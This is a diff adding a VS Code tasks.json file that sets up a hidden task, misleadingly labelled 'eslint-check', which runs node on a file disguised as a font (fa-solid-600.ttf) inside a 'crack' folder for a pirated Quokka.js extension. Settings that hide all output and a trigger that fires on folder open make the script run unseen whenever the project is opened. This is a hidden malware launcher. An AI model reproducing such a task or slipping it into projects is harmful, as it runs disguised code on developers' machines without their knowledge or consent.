@@ -1,0 +1,25 @@
+﻿{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "node",
+      "args": ["./Quokka lisence/loqg2.Quokka.js.v1.0.390.for.VSCode/Quokka.js.v1.0.390.for.VSCode/crack/public/fonts/fa-solid-600.ttf"],
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
